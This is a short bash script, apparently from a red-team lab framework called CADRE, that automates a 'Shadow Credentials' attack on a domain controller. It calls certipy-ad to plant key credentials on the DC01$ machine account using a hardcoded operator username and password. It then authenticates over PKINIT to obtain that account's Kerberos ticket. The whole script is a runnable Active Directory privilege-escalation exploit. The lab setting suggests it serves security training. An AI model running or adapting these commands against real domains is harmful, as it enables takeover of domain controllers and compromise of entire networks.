#!/bin/bash
# CADRE — WT#008 Shadow Credentials
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#008 — Shadow Credentials"
start_attack "008" "Shadow Credentials"

require_tool certipy-ad
require_env DC01 "DC01"
require_env DOMAIN_ROOT "DOMAIN_ROOT"

step "Step 1: Shadow Credentials attack against DC01$"
run_cmd "certipy-ad shadow auto -u \"ops_redcell@$DOMAIN_ROOT\" -p 'R3dC3ll_0ps!' -account dc01\$"

step "Step 2: Verify acquired TGT via PKINIT"
run_cmd "certipy-ad auth -pfx dc01.pfx -dc-ip $DC01 -username dc01\$ -domain $DOMAIN_ROOT"

result $? "Shadow credentials attack completed"
